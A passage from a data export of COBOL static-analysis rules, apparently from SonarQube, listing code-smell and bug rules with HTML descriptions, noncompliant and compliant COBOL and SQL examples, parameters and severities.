fillers.</p>","""INITIALIZE"" should not be used",[],MINOR,['suspicious'],CODE_SMELL
2013-12-03T11:11:14+0100,"<p>There is no good reason to keep an empty and therefore valueless section. Such sections should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FIRST SECTION.
  MOVE A TO B.

SECOND SECTION.  *&gt; Noncompliant; empty

THIRD SECTION.

someParagraph.
  DISPLAY B.
</pre>
<h2>Compliant Solution</h2>
<pre>
FIRST SECTION.
  MOVE A TO B.

THIRD SECTION.

someParagraph.
  DISPLAY B.
</pre>",cobol:S1303,cobol,COBOL,"<p>There is no good reason to keep an empty and therefore valueless section. Such sections should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FIRST SECTION.
  MOVE A TO B.

SECOND SECTION.  *&gt; Noncompliant; empty

THIRD SECTION.

someParagraph.
  DISPLAY B.
</pre>
<h2>Compliant Solution</h2>
<pre>
FIRST SECTION.
  MOVE A TO B.

THIRD SECTION.

someParagraph.
  DISPLAY B.
</pre>",Sections should not be empty,[],MAJOR,['unused'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>SQL queries with large <code>WHERE</code> clauses are complex. Complex queries are generally not performant, in addition to being difficult to
understand and therefore to maintain.</p>",cobol:WhereClauseLinesCheck,cobol,COBOL,"<p>SQL queries with large <code>WHERE</code> clauses are complex. Complex queries are generally not performant, in addition to being difficult to
understand and therefore to maintain.</p>","""WHERE"" clauses should not contain too many lines of code","[{'key': 'maximumLinesThreshold', 'htmlDesc': 'The maximum authorized number of lines in a &quot;WHERE&quot; clause', 'defaultValue': '32', 'type': 'INTEGER'}]",MAJOR,"['brain-overload', 'performance', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>When a closable statement contains nested statements, it can quickly become difficult to see which statements are nested and which are not. That's
why ending a list of nested statements with <code>END-${STATEMENT-NAME}</code> is advised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
READ DF-PARAM-SPILOTE AT END
  GO TO F-LECT-SPILOTE.
</pre>
<h2>Compliant Solution</h2>
<pre>
READ DF-PARAM-SPILOTE AT END
  GO TO F-LECT-SPILOTE
END-READ.
</pre>",cobol:COBOL.ClosableStatementCheck,cobol,COBOL,"<p>When a closable statement contains nested statements, it can quickly become difficult to see which statements are nested and which are not. That's
why ending a list of nested statements with <code>END-${STATEMENT-NAME}</code> is advised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
READ DF-PARAM-SPILOTE AT END
  GO TO F-LECT-SPILOTE.
</pre>
<h2>Compliant Solution</h2>
<pre>
READ DF-PARAM-SPILOTE AT END
  GO TO F-LECT-SPILOTE
END-READ.
</pre>",Closable statements with nested statements should be closed,"[{'key': 'evaluate', 'htmlDesc': ""'true' to apply the rule to &quot;EVALUATE&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'perform', 'htmlDesc': ""'true' to apply the rule to &quot;PERFORM&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'add', 'htmlDesc': ""'true' to apply the rule to &quot;ADD&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'subtract', 'htmlDesc': ""'true' to apply the rule to &quot;SUBTRACT&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'multiply', 'htmlDesc': ""'true' to apply the rule to &quot;MULTIPLY&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'divide', 'htmlDesc': ""'true' to apply the rule to &quot;DIVIDE&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'call', 'htmlDesc': ""'true' to apply the rule to &quot;CALL&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'read', 'htmlDesc': ""'true' to apply the rule to &quot;READ&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'write', 'htmlDesc': ""'true' to apply the rule to &quot;WRITE&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'string', 'htmlDesc': ""'true' to apply the rule to &quot;STRING&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'unstring', 'htmlDesc': ""'true' to apply the rule to &quot;UNSTRING&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'if', 'htmlDesc': ""'true' to apply the rule to &quot;IF&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}, {'key': 'search', 'htmlDesc': ""'true' to apply the rule to &quot;SEARCH&quot; statements, 'false' otherwise"", 'defaultValue': 'true', 'type': 'BOOLEAN'}]",MAJOR,['confusing'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Every paragraph should be commented to explain its goal and how it works. This comment can be placed either just before or just after the paragraph
label. Moreover paragraphs used to close a module can be left uncommented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 PROCEDURE DIVISION.

    PARAGRAPH1.           *&gt; Noncompliant
    ...

*-------
    PARAGRAPH2.           *&gt; Noncompliant; the comment is empty
    ...

      PERFORM P1 THRU P2.
    ...

*Some comments                                  *&gt; Compliant
    P1.
      ....

    P2.                                         *&gt; No violation as the this P2 paragraph close a module
       MOVE A TO B.
       ...
       EXIT.
</pre>
<h2>Compliant Solution</h2>
<pre>
 PROCEDURE DIVISION.

* Some comments
    PARAGRAPH1.     *&gt;  Compliant; the comment is just before
    ...

    PARAGRAPH2.     *&gt;  Compliant; the comment is just after
* Some comments
    ...
      PERFORM P1 THRU P2.
    ...

*Some comments
    P1.
      ....

    P2.
       MOVE A TO B.
       ...
       EXIT.
</pre>",cobol:COBOL.ParagraphUncommentedCheck,cobol,COBOL,"<p>Every paragraph should be commented to explain its goal and how it works. This comment can be placed either just before or just after the paragraph
label. Moreover paragraphs used to close a module can be left uncommented.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 PROCEDURE DIVISION.

    PARAGRAPH1.           *&gt; Noncompliant
    ...

*-------
    PARAGRAPH2.           *&gt; Noncompliant; the comment is empty
    ...

      PERFORM P1 THRU P2.
    ...

*Some comments                                  *&gt; Compliant
    P1.
      ....

    P2.                                         *&gt; No violation as the this P2 paragraph close a module
       MOVE A TO B.
       ...
       EXIT.
</pre>
<h2>Compliant Solution</h2>
<pre>
 PROCEDURE DIVISION.

* Some comments
    PARAGRAPH1.     *&gt;  Compliant; the comment is just before
    ...

    PARAGRAPH2.     *&gt;  Compliant; the comment is just after
* Some comments
    ...
      PERFORM P1 THRU P2.
    ...

*Some comments
    P1.
      ....

    P2.
       MOVE A TO B.
       ...
       EXIT.
</pre>",Paragraphs should be documented,[],MAJOR,['convention'],CODE_SMELL
2014-01-31T10:12:05+0100,"<p>When using some transaction managers like IBM IMS, each COBOL program is in fact considered a sub-program by the transaction manager. The
<code>GOBACK</code> statement returns control to the transaction manager, but using <code>STOP RUN</code> might cause unpredictable results or
abnormal termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
STOP RUN
</pre>
<h2>Compliant Solution</h2>
<pre>
GOBACK
</pre>",cobol:S1476,cobol,COBOL,"<p>When using some transaction managers like IBM IMS, each COBOL program is in fact considered a sub-program by the transaction manager. The
<code>GOBACK</code> statement returns control to the transaction manager, but using <code>STOP RUN</code> might cause unpredictable results or
abnormal termination.</p>
<h2>Noncompliant Code Example</h2>
<pre>
STOP RUN
</pre>
<h2>Compliant Solution</h2>
<pre>
GOBACK
</pre>","""GOBACK"" should be used instead of ""STOP RUN""",[],CRITICAL,[],BUG
2014-07-25T08:22:45+0200,"<p>When you need access to data from multiple tables, it is more efficient, effective, and understandable to use pre-built views than to select the
data from a large number of tables - effectively creating in-memory views - at runtime.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 3 joined tables:</p>
<pre>
SELECT PERSONS.NAME, COUNTRIES.NAME, GENRES.NAME, PROFESSIONS.NAME
FROM PERSONS
  INNER JOIN COUNTRIES ON COUNTRIES.ID = PERSON.COUNTRY_ID
  INNER JOIN GENRES ON GENRES.ID = PERSONS.GENRE_ID
  INNER JOIN PROFESSIONS ON PROFESSIONS.ID = PERSONS.PROFESSIONS_ID  -- Noncompliant; this is table #4
WHERE COUNTRIES.CODE = 'US'

SELECT PERSONS.NAME, COUNTRIES.NAME, GENRES.NAME, PROFESSIONS.NAME
FROM PERSONS, COUNTRIES, GENRES, PROFESSIONS -- Noncompliant
WHERE COUNTRIES.CODE = 'US' AND COUNTRIES.ID = PERSON.COUNTRY_ID AND GENRES.ID = PERSONS.GENRE_ID AND PROFESSIONS.ID = PERSONS.PROFESSIONS_ID
</pre>",cobol:S1631,cobol,COBOL,"<p>When you need access to data from multiple tables, it is more efficient, effective, and understandable to use pre-built views than to select the
data from a large number of tables - effectively creating in-memory views - at runtime.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 3 joined tables:</p>
<pre>
SELECT PERSONS.NAME, COUNTRIES.NAME, GENRES.NAME, PROFESSIONS.NAME
FROM PERSONS
  INNER JOIN COUNTRIES ON COUNTRIES.ID = PERSON.COUNTRY_ID
  INNER JOIN GENRES ON GENRES.ID = PERSONS.GENRE_ID
  INNER JOIN PROFESSIONS ON PROFESSIONS.ID = PERSONS.PROFESSIONS_ID  -- Noncompliant; this is table #4
WHERE COUNTRIES.CODE = 'US'

SELECT PERSONS.NAME, COUNTRIES.NAME, GENRES.NAME, PROFESSIONS.NAME
FROM PERSONS, COUNTRIES, GENRES, PROFESSIONS -- Noncompliant
WHERE COUNTRIES.CODE = 'US' AND COUNTRIES.ID = PERSON.COUNTRY_ID AND GENRES.ID = PERSONS.GENRE_ID AND PROFESSIONS.ID = PERSONS.PROFESSIONS_ID
</pre>",SQL statements should not join too many tables,"[{'key': 'max_tables', 'htmlDesc': 'The maximum number of tables allowed in a join', 'defaultValue': '4', 'type': 'INTEGER'}]",MAJOR,"['brain-overload', 'performance', 'sql']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>This a limit of the Microfocus COBOL compiler.</p>
<h2>See</h2>
<ul>
  <li> <a
  href=""http://supportline.microfocus.com/documentation/books/sx20books/prlimi.htm"">http://supportline.microfocus.com/documentation/books/sx20books/prlimi.htm</a> </li>
</ul>",cobol:COBOL.FileDataItemSizeCheck,cobol,COBOL,"<p>This a limit of the Microfocus COBOL compiler.</p>
<h2>See</h2>
<ul>
  <li> <a
  href=""http://supportline.microfocus.com/documentation/books/sx20books/prlimi.htm"">http://supportline.microfocus.com/documentation/books/sx20books/prlimi.htm</a> </li>
</ul>","File data items should not exceed 63,488 characters",[],BLOCKER,['microfocus'],BUG
2014-01-31T10:12:05+0100,"<p>The worst nightmare of every COBOL maintenance programmer is a program where you have to follow 12 concatenated <code>PERFORM</code> statements
before you get to the actual processing. This is considered to be the <code>GOTO</code>-less version of spaghetti programming. </p>
<p>This situation can be avoided by having a mainline procedure at the beginning of the procedure division which concentrates all program control, and
which reads like a map of the program. This mainline procedure should be free from detailed operations such as moving fields, calculations, I/O
operations, and so on.</p>
<p>This rule helps ensure that most program control is concentrated in the mainline procedure (the first one in the program) by preventing the other
procedures from having more than a predefined threshold of ""PERFORM"" statements.</p>",cobol:S1474,cobol,COBOL,"<p>The worst nightmare of every COBOL maintenance programmer is a program where you have to follow 12 concatenated <code>PERFORM</code> statements
before you get to the actual processing. This is considered to be the <code>GOTO</code>-less version of spaghetti programming. </p>
<p>This situation can be avoided by having a mainline procedure at the beginning of the procedure division which concentrates all program control, and
which reads like a map of the program. This mainline procedure should be free from detailed operations such as moving fields, calculations, I/O
operations, and so on.</p>
<p>This rule helps ensure that most program control is concentrated in the mainline procedure (the first one in the program) by preventing the other
procedures from having more than a predefined threshold of ""PERFORM"" statements.</p>","The number of ""PERFORM"" statements in a procedure, section, or paragraph should be limited","[{'key': 'max', 'htmlDesc': 'Maximum allowed number of &quot;PERFORM&quot; per procedure', 'defaultValue': '10', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2015-04-07T09:32:38+0200,"<p>Having two <code>WHEN</code> clauses in the same <code>EVALUATE</code> statement or two branches in the same <code>IF</code> structure with the
same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then they should be
combined, for an <code>IF</code> structure or one should fall through to the other for an <code>EVALUATE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EVALUATE X
  WHEN 1
    MOVE A TO B.
    PERFORM SECTION1
  WHEN 2
    MOVE A TO C.
    PERFORM SECTION2
  WHEN 3              *&gt; Noncompliant; duplicates WHEN 1's implementation
    MOVE A TO B.
    PERFORM SECTION1
END-EVALUATE.

IF X = 1
  MOVE A TO B.
  PERFORM SECTION1
ELSE
  IF X &gt; 10
    PERFORM SECTION2
  ELSE                *&gt; Noncompliant
    MOVE A TO B.
    PERFORM SECTION1
  END-IF
END-IF.
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>IF</code> chain that contain a single line of code are ignored, as are blocks in a <code>EVALUATE</code> statement that contain
a single line of code.</p>
<pre>
EVALUATE X
  WHEN 1
    PERFORM SECTION1
  WHEN 2
    PERFORM SECTION2
  WHEN 3              *&gt; no issue, usually this is done on purpose to increase the readability
    PERFORM SECTION1
END-EVALUATE.
</pre>
<p>But this exception does not apply to <code>IF</code> chains without <code>ELSE</code>-s, or to <code>EVALUATE</code>-s without <code>WHEN
OTHER</code> clauses when all branches have the same single line of code. In case of <code>IF</code> chains with <code>ELSE</code>-s, or of
<code>EVALUATE</code>-es with <code>WHEN OTHER</code> clauses, rule <a href='/coding_rules#rule_key=cobol%3AS3923'>S3923</a> raises a bug. </p>
<pre>
EVALUATE X
  WHEN 1
    PERFORM SECTION1
  WHEN 3              *&gt; Noncompliant, this might have been done on purpose but probably not
    PERFORM SECTION1
END-EVALUATE.
</pre>",cobol:S1871,cobol,COBOL,"<p>Having two <code>WHEN</code> clauses in the same <code>EVALUATE</code> statement or two branches in the same <code>IF</code> structure with the
same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then they should be
combined, for an <code>IF</code> structure or one should fall through to the other for an <code>EVALUATE</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
EVALUATE X
  WHEN 1
    MOVE A TO B.
    PERFORM SECTION1
  WHEN 2
    MOVE A TO C.
    PERFORM SECTION2
  WHEN 3              *&gt; Noncompliant; duplicates WHEN 1's implementation
    MOVE A TO B.
    PERFORM SECTION1
END-EVALUATE.

IF X = 1
  MOVE A TO B.
  PERFORM SECTION1
ELSE
  IF X &gt; 10
    PERFORM SECTION2
  ELSE                *&gt; Noncompliant
    MOVE A TO B.
    PERFORM SECTION1
  END-IF
END-IF.
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>IF</code> chain that contain a single line of code are ignored, as are blocks in a <code>EVALUATE</code> statement that contain
a single line of code.</p>
<pre>
EVALUATE X
  WHEN 1
    PERFORM SECTION1
  WHEN 2
    PERFORM SECTION2
  WHEN 3              *&gt; no issue, usually this is done on purpose to increase the readability
    PERFORM SECTION1
END-EVALUATE.
</pre>
<p>But this exception does not apply to <code>IF</code> chains without <code>ELSE</code>-s, or to <code>EVALUATE</code>-s without <code>WHEN
OTHER</code> clauses when all branches have the same single line of code. In case of <code>IF</code> chains with <code>ELSE</code>-s, or of
<code>EVALUATE</code>-es with <code>WHEN OTHER</code> clauses, rule {rule:cobol:S3923} raises a bug. </p>
<pre>
EVALUATE X
  WHEN 1
    PERFORM SECTION1
  WHEN 3              *&gt; Noncompliant, this might have been done on purpose but probably not
    PERFORM SECTION1
END-EVALUATE.
</pre>",Two branches in a conditional structure should not have exactly the same implementation,[],MAJOR,"['design', 'suspicious']",CODE_SMELL
2014-01-31T10:12:05+0100,"<p>To improve source code readability and reusability, SQL operations should be located in dedicated procedures (sections or paragraphs) and should
not be mixed with other SQL requests.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MAIN_PARAGRAPH.
  ...
  LOAD_SALARY.
  ...

LOAD_SALARY.
  EXEC SQL CONNECT :UID IDENTIFIED BY :PASS END-EXEC.
  EXEC SQL USE tempdb END-EXEC.   *&lt; Noncompliant
  EXEC SQL
    SELECT   SALARY
        INTO  :HV-SALARY
      FROM EMPLOYEE
        WHERE EMPNAME = 'XXXXXXX'
  END-EXEC.
  EXIT.
</pre>
<h2>Compliant Solution</h2>
<pre>
MAIN_PARAGRAPH.
  ...
  CONNECT_TO_DB.
  USE_TMP_DB_SCHEMA.
  ...
  LOAD_SALARY.
  ...
CONNECT_TO_DB.
  EXEC SQL CONNECT :UID IDENTIFIED BY :PASS END-EXEC.
  EXIT.

USE_TMP_DB_SCHEMA.
  EXEC SQL USE tempdb END-EXEC.
  EXIT.

LOAD_SALARY.
  EXEC SQL
    SELECT   SALARY
        INTO  :HV-SALARY
      FROM EMPLOYEE
        WHERE EMPNAME = 'XXXXXXX'
  END-EXEC.
  EXIT
</pre>",cobol:S1473,cobol,COBOL,"<p>To improve source code readability and reusability, SQL operations should be located in dedicated procedures (sections or paragraphs) and should
not be mixed with other SQL requests.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MAIN_PARAGRAPH.
  ...
  LOAD_SALARY.
  ...

LOAD_SALARY.
  EXEC SQL CONNECT :UID IDENTIFIED BY :PASS END-EXEC.
  EXEC SQL USE tempdb END-EXEC.   *&lt; Noncompliant
  EXEC SQL
    SELECT   SALARY
        INTO  :HV-SALARY
      FROM EMPLOYEE
        WHERE EMPNAME = 'XXXXXXX'
  END-EXEC.
  EXIT.
</pre>
<h2>Compliant Solution</h2>
<pre>
MAIN_PARAGRAPH.
  ...
  CONNECT_TO_DB.
  USE_TMP_DB_SCHEMA.
  ...
  LOAD_SALARY.
  ...
CONNECT_TO_DB.
  EXEC SQL CONNECT :UID IDENTIFIED BY :PASS END-EXEC.
  EXIT.

USE_TMP_DB_SCHEMA.
  EXEC SQL USE tempdb END-EXEC.
  EXIT.

LOAD_SALARY.
  EXEC SQL
    SELECT   SALARY
        INTO  :HV-SALARY
      FROM EMPLOYEE
        WHERE EMPNAME = 'XXXXXXX'
  END-EXEC.
  EXIT
</pre>",Sections and paragraphs should not perform more than one SQL operation,[],MAJOR,"['brain-overload', 'sql']",CODE_SMELL
2019-03-13T09:11:18+0100,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
COMPUTE x = (y / 2 + 1).  *&gt; Compliant even if the parenthesis are ignored by the compiler
COMPUTE y = 2 * ((x + 1)).  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
COMPUTE x = (y / 2 + 1).
COMPUTE y = 2 * (x + 1).
</pre>",cobol:S1110,cobol,COBOL,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
COMPUTE x = (y / 2 + 1).  *&gt; Compliant even if the parenthesis are ignored by the compiler
COMPUTE y = 2 * ((x + 1)).  *&gt; Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
COMPUTE x = (y / 2 + 1).
COMPUTE y = 2 * (x + 1).
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2017-04-11T12:32:43+0200,"<p>The number of <code>RECORDS</code> or <code>CHARACTERS</code> specified in a <code>BLOCK CONTAINS</code> clause is used to determine block size.
Specify <code>10 RECORDS</code>, and the block will be exactly 10x the length of the record. But that may not be the right size, depending on the
environment. Instead, it is considered a best practice to specify <code>0 RECORDS</code>, so the block size will be calculated automatically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       FD OUTFILE1
           BLOCK CONTAINS 32760 RECORDS     &gt;* Noncompliant
           RECORDING MODE V.
       FD OUTFILE2
           BLOCK CONTAINS 1024 CHARACTERS.  &gt;* Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
       FD OUTFILE1
           BLOCK CONTAINS 0 RECORDS
           RECORDING MODE V.
       FD OUTFILE2
           BLOCK CONTAINS 0 RECORDS.
</pre>
<h2>Exceptions</h2>
<p><code>0 CHARACTERS</code> is compliant.</p>",cobol:S3891,cobol,COBOL,"<p>The number of <code>RECORDS</code> or <code>CHARACTERS</code> specified in a <code>BLOCK CONTAINS</code> clause is used to determine block size.
Specify <code>10 RECORDS</code>, and the block will be exactly 10x the length of the record. But that may not be the right size, depending on the
environment. Instead, it is considered a best practice to specify <code>0 RECORDS</code>, so the block size will be calculated automatically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
       FD OUTFILE1
           BLOCK CONTAINS 32760 RECORDS     &gt;* Noncompliant
           RECORDING MODE V.
       FD OUTFILE2
           BLOCK CONTAINS 1024 CHARACTERS.  &gt;* Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
       FD OUTFILE1
           BLOCK CONTAINS 0 RECORDS
           RECORDING MODE V.
       FD OUTFILE2
           BLOCK CONTAINS 0 RECORDS.
</pre>
<h2>Exceptions</h2>
<p><code>0 CHARACTERS</code> is compliant.</p>","""0 RECORDS"" should be specified for ""BLOCK CONTAINS""",[],CRITICAL,"['clumsy', 'suspicious']",CODE_SMELL
2017-04-11T12:32:43+0200,"<p><code>COPY ... SUPPRESS</code> suppresses the inclusion of the copybook contents from the source listing, making it very difficult to gain a
complete understanding of what's happening in the code. This could hinder both maintenance and debugging.</p>
<h2>Noncompliant Code Example</h2>
<pre>
COPY XX001234 SUPPRESS.  &lt;* Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
COPY XX001234.
</pre>",cobol:S3892,cobol,COBOL,"<p><code>COPY ... SUPPRESS</code> suppresses the inclusion of the copybook contents from the source listing, making it very difficult to gain a
complete understanding of what's happening in the code. This could hinder both maintenance and debugging.</p>
<h2>Noncompliant Code Example</h2>
<pre>
COPY XX001234 SUPPRESS.  &lt;* Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
COPY XX001234.
</pre>","""COPY SUPPRESS"" should not be used",[],CRITICAL,['confusing'],CODE_SMELL
2017-04-11T12:32:43+0200,"<p>This rule allows banning certain statements. </p>
<h2>Noncompliant Code Example</h2>
<p>Given a parameter of <code>CANCEL</code> for this rule: </p>
<pre>
DISPLAY ""Cancelling action"".
CANCEL PROGRAM1. *&gt; Noncompliant
</pre>",cobol:S3938,cobol,COBOL,"<p>This rule allows banning certain statements. </p>
<h2>Noncompliant Code Example</h2>
<p>Given a parameter of <code>CANCEL</code> for this rule: </p>
<pre>
DISPLAY ""Cancelling action"".
CANCEL PROGRAM1. *&gt; Noncompliant
</pre>",Track uses of forbidden statements,"[{'key': 'statements', 'htmlDesc': 'Comma-separated list of disallowed statements, such as &quot;EXIT PROGRAM, CANCEL&quot;', 'type': 'STRING'}]",INFO,[],CODE_SMELL
2017-04-11T12:32:43+0200,"<p><code>OCCURS DEPENDING ON</code> clauses are complicated to use correctly and do not provide any benefits with regard to memory consumption. It is
best to avoid them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01&nbsp; MYTABLEACCOUNT PIC S9(4) BINARY.
01&nbsp; MYTABLE.
  05&nbsp; MYITEM OCCURS 1 to 1000 DEPENDING ON MYTABLEACCOUNT.
&nbsp;&nbsp;  10&nbsp; MYFIELD1 PIC X(8).
&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp; MYFIELD2 PIC S9(4) BINARY.
</pre>
<h2>Compliant Solution</h2>
<pre>
01&nbsp; MYTABLE.
  05&nbsp; MYITEM OCCURS 1000.
&nbsp;&nbsp;  10&nbsp; MYFIELD1 X(8).
&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp; MYFIELD2 PIC S9(4) BINARY.
</pre>",cobol:S3939,cobol,COBOL,"<p><code>OCCURS DEPENDING ON</code> clauses are complicated to use correctly and do not provide any benefits with regard to memory consumption. It is
best to avoid them.</p>
<h2>Noncompliant Code Example</h2>
<pre>
01&nbsp; MYTABLEACCOUNT PIC S9(4) BINARY.
01&nbsp; MYTABLE.
  05&nbsp; MYITEM OCCURS 1 to 1000 DEPENDING ON MYTABLEACCOUNT.
&nbsp;&nbsp;  10&nbsp; MYFIELD1 PIC X(8).
&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp; MYFIELD2 PIC S9(4) BINARY.
</pre>
<h2>Compliant Solution</h2>
<pre>
01&nbsp; MYTABLE.
  05&nbsp; MYITEM OCCURS 1000.
&nbsp;&nbsp;  10&nbsp; MYFIELD1 X(8).
&nbsp;&nbsp;&nbsp;&nbsp;10&nbsp; MYFIELD2 PIC S9(4) BINARY.
</pre>","""OCCURS DEPENDING ON"" should not be used",[],MAJOR,['confusing'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>In most companies the choice is done either to work with <code>PERFORM paragraph1</code> or with <code>PERFORM paragraph1 THRU paragraph2</code>.
Mixing the two approches is error prone when creating a new paragraph in the middle of an existing source code because there is no easy way to know if
an existing execution flow might go through this new paragraph. This rule helps sustain the use of <code>PERFORM ... THRU...</code>.</p>",cobol:COBOL.PerformThruParagraphMandatoryCheck,cobol,COBOL,"<p>In most companies the choice is done either to work with <code>PERFORM paragraph1</code> or with <code>PERFORM paragraph1 THRU paragraph2</code>.
Mixing the two approches is error prone when creating a new paragraph in the middle of an existing source code because there is no easy way to know if
an existing execution flow might go through this new paragraph. This rule helps sustain the use of <code>PERFORM ... THRU...</code>.</p>","""PERFORM PARAGRAPH"" should not be used","[{'key': 'exclusionList', 'htmlDesc': 'Comma separated list of paragraphs that can be called with the &quot;PERFORM&quot; procedure statement', 'type': 'STRING'}]",MAJOR,['pitfall'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that first level data item names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given an regular expression of <code>WS-.*</code>:</p>
<pre>
       WORKING-STORAGE SECTION.
            01 WRONG.                                       &gt; Noncompliant; name doesn't match the pattern ""WS-.*""
              02  LINK.                                     &gt; Compliant; this is not first level

       LINKAGE SECTION.
             01     DFHCOMMAREA PIC X(1500).                &gt; Compliant; the data item is defined in the LINKAGE SECTION
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
            01 WS-LINK.
              02  LINK.

       LINKAGE SECTION.
             01     DFHCOMMAREA PIC X(1500).
</pre>",cobol:COBOL.FirstLevelDataItemNamingCheck,cobol,COBOL,"<p>Shared coding conventions allow teams to collaborate efficiently. This rule checks that first level data item names match a provided regular
expression.</p>
<h2>Noncompliant Code Example</h2>
<p>Given an regular expression of <code>WS-.*</code>:</p>
<pre>
       WORKING-STORAGE SECTION.
            01 WRONG.                                       &gt; Noncompliant; name doesn't match the pattern ""WS-.*""
              02  LINK.                                     &gt; Compliant; this is not first level

       LINKAGE SECTION.
             01     DFHCOMMAREA PIC X(1500).                &gt; Compliant; the data item is defined in the LINKAGE SECTION
</pre>
<h2>Compliant Solution</h2>
<pre>
       WORKING-STORAGE SECTION.
            01 WS-LINK.
              02  LINK.

       LINKAGE SECTION.
             01     DFHCOMMAREA PIC X(1500).
</pre>",First level data items should follow a naming convention,"[{'key': 'regexPatternString', 'htmlDesc': 'A regular expression to specify the data item naming convention', 'defaultValue': '.*', 'type': 'STRING'}]",MINOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>An unused paragraph is never called explicitly with help of the <code>GO TO</code> or <code>PERFORM</code> statements.</p>
<p>There are only two reasons for such a paragraph:</p>
<ul>
  <li> It is really unused, and should be removed </li>
  <li> It is used as a kind of comment to clearly delimit a block of code, which is bad practice </li>
</ul>
<p>The remediation action should be:</p>
<ul>
  <li> Replace the paragraph by a comment line </li>
  <li> Refactor the code to make an explicit call to this paragraph instead of letting the execution flow going through it implicitly </li>
</ul>",cobol:COBOL.UnusedParagraphOrSectionLabelCheck,cobol,COBOL,"<p>An unused paragraph is never called explicitly with help of the <code>GO TO</code> or <code>PERFORM</code> statements.</p>
<p>There are only two reasons for such a paragraph:</p>
<ul>
  <li> It is really unused, and should be removed </li>
  <li> It is used as a kind of comment to clearly delimit a block of code, which is bad practice </li>
</ul>
<p>The remediation action should be:</p>
<ul>
  <li> Replace the paragraph by a comment line </li>
  <li> Refactor the code to make an explicit call to this paragraph instead of letting the execution flow going through it implicitly </li>
</ul>",Unused paragraphs should be removed,"[{'key': 'exclusionList', 'htmlDesc': 'Comma separated list of paragraphs that should not be checked', 'type': 'STRING'}]",MAJOR,['unused'],CODE_SMELL
2014-06-06T08:18:23+0200,"<p>COBOL files containing a large number of sections are by definition difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>Sections contained in copybooks are not taken into account when computing the total number of sections in a program.</p>",cobol:S1755,cobol,COBOL,"<p>COBOL files containing a large number of sections are by definition difficult to understand and therefore to maintain.</p>
<h2>Exceptions</h2>
<p>Sections contained in copybooks are not taken into account when computing the total number of sections in a program.</p>",Files should not contain too many sections,"[{'key': 'threshold', 'htmlDesc': 'The maximum authorized sections.', 'defaultValue': '100', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The <code>ALTER</code> statement should not be used. Trying to understand a program where the instruction as it appears may not be the actual
instruction encountered by the program is very difficult, if not impossible.</p>
<p>If you need to change the processing sequence due to a certain condition, use <code>PERFORM</code> or <code>GO TO</code> instead.</p>",cobol:COBOL.AlterStatementUsageCheck,cobol,COBOL,"<p>The <code>ALTER</code> statement should not be used. Trying to understand a program where the instruction as it appears may not be the actual
